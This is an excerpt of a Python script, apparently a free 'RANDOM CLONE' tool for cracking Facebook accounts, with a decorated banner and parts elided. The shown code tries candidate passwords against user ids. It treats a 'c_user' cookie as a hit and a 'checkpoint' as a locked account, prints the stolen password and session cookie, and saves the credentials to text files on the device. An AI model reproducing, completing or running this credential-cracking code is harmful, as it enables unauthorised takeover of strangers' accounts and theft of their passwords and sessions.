...
logo = ("""
 ...
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [] AUTHOR    \033[1;91m: \033[1;92mPyshco                       ┃
 ┃ [] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE                ┃
 ┃ [] STATUS    \033[1;91m: \033[1;92mFREE                        ┃
 ┃ [] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                 ┃
 ┃ [] GITHUB    \033[1;91m: \033[1;92mPyshco143                  ┃
 ┃ [] FACEBOOK  \033[1;91m: \033[1;92mPyshco                  ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
...
def num():
    ...
    print(' [+] Ids saved in Pyshco-ok.txt,Pyshco-cp.txt')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92m[Pyshco]\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[Pyshco-OK💚] {uid} | {ps}")
                print(f" Cookie : {coki}")
                open('/sdcard/Pyshco-ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[Pyshco-CP💔] {uid}|{ps}")
                open('/sdcard/Pyshco-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[Pyshco] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
